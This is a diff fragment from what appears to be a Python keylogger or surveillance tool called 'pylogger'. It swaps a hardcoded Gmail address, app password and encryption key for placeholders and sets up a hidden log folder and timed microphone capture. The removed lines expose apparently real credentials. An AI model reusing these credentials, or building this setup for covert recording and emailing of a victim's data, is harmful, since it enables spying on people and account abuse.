@@ -48,14 +48,14 @@ mic_time = 10
 time_iteration = 15
 number_of_iterations_end = 3 
 
-email_addr = "divkirnapure7@gmail.com"
-password = "uqrlxmkvoncsccru"
+email_addr = "your email address"
+password = "your password"
 
-toaddr = "divkirnapure7@gmail.com"
+toaddr = "your email"
 
 username = getpass.getuser()
 
-key = "ZKG-hah0-GiBfJOqhwbzobPEvh9z1xhFOPYIimr5Id4="
+key = "your encryption key"
 
 file_path = f"C:\\Users\\{username}\\pylogger"
 os.makedirs(file_path, exist_ok=True)
